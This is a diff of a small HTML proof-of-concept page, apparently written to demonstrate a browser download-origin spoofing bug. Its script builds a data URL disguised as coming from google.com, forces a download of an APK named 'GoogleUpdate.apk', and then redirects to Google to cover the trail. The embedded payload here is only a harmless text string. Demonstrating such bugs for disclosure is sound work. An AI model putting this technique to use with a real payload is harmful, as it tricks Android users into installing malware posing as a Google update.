@@ -22,23 +22,23 @@
 </head>
 
 <body>
-  <h2>Download  PoC</h2>
+  <h2>Download PoC</h2>
   <p>Tap the button below</p>
 
   <button onclick="start()">Download</button>
 
   <script>
     function start() {
-      // STEP 1: trigger spoofed download
       const a = document.createElement("a");
       a.href =
-        "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
+        "data://google.com/application/vnd.android.package-archive;base64," +
+        "VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==" +
+        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
       a.download = "GoogleUpdate.apk";
       document.body.appendChild(a);
       a.click();
       a.remove();
 
-      // STEP 2: redirect AFTER download is initiated
       setTimeout(() => {
         location.href = "https://www.google.com";
       }, 3000);
